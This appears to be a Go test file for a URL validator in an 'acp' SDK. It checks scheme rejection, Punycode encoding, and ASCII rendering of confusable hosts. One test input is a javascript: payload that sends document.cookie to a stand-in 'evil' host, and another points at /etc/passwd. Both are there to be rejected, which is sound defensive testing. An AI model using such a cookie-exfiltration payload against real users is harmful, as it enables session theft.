package acp

import "testing"

func TestCreateElicitationUrl_SafeURL(t *testing.T) {
	tests := []struct {
		name    string
		url     string
		wantErr bool
	}{
		{"https", "https://example.com/auth", false},
		{"http for a local auth callback", "http://localhost:1234/auth", false},
		{"javascript scheme", "javascript:fetch('http://evil/'+document.cookie)", true},
		{"file scheme", "file:///etc/passwd", true},
		{"smb scheme", "smb://fileserver/share", true},
		{"custom app scheme", "vscode://vscode.git/clone?url=x", true},
		{"scheme-relative, no scheme", "//example.com/auth", true},
		{"https without a host", "https:///auth", true},
		{"empty", "", true},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got, err := CreateElicitationUrl{Url: tc.url}.SafeURL()
			if tc.wantErr {
				if err == nil {
					t.Fatalf("SafeURL(%q) = %v, want an error", tc.url, got)
				}
				return
			}
			if err != nil {
				t.Fatalf("SafeURL(%q) returned %v, want no error", tc.url, err)
			}
			if got.String() != tc.url {
				t.Fatalf("SafeURL(%q) round-tripped to %q", tc.url, got.String())
			}
		})
	}
}

// RFC 3492's own examples, plus two IDN TLDs whose ASCII form is publicly fixed. The
// encoder is hand-written because the SDK carries no dependencies and the standard
// library exposes no IDNA API, so it is worth pinning against known-good output.
func TestPunycodeMatchesKnownVectors(t *testing.T) {
	for _, tc := range []struct{ in, want string }{
		{"bücher", "bcher-kva"},
		{"münchen", "mnchen-3ya"},
		{"δοκιμή", "jxalpdlp"},
		{"рф", "p1ai"},
	} {
		got, ok := punyEncode(tc.in)
		if !ok {
			t.Fatalf("punyEncode(%q) failed", tc.in)
		}
		if got != tc.want {
			t.Fatalf("punyEncode(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
}

// A host that renders as a well-known name but is not it must not be handed to the
// caller in the form that renders. The doc comment tells callers to show the host, so
// the host is what has to be unambiguous.
func TestSafeURLReturnsConfusableHostAsASCII(t *testing.T) {
	u := CreateElicitationUrl{Url: "https://аpple.com/auth"}
	target, err := u.SafeURL()
	if err != nil {
		t.Fatalf("SafeURL: %v", err)
	}
	if target.Host == "apple.com" {
		t.Fatal("a confusable host was returned in the form that renders as apple.com")
	}
	if target.Host != "xn--pple-43d.com" {
		t.Fatalf("host = %q, want the ASCII form xn--pple-43d.com", target.Host)
	}
}

// An ordinary ASCII host, with or without a port, must pass through untouched.
func TestSafeURLLeavesASCIIHostsAlone(t *testing.T) {
	for _, tc := range []struct{ url, want string }{
		{"https://example.com/auth", "example.com"},
		{"http://localhost:8080/auth", "localhost:8080"},
		{"https://127.0.0.1:9000/auth", "127.0.0.1:9000"},
	} {
		target, err := CreateElicitationUrl{Url: tc.url}.SafeURL()
		if err != nil {
			t.Fatalf("SafeURL(%q): %v", tc.url, err)
		}
		if target.Host != tc.want {
			t.Fatalf("host = %q, want %q", target.Host, tc.want)
		}
	}
}

// A non-ASCII host with a port keeps the port.
func TestSafeURLKeepsPortOnEncodedHost(t *testing.T) {
	target, err := CreateElicitationUrl{Url: "https://münchen.de:8443/auth"}.SafeURL()
	if err != nil {
		t.Fatalf("SafeURL: %v", err)
	}
	if target.Host != "xn--mnchen-3ya.de:8443" {
		t.Fatalf("host = %q", target.Host)
	}
}
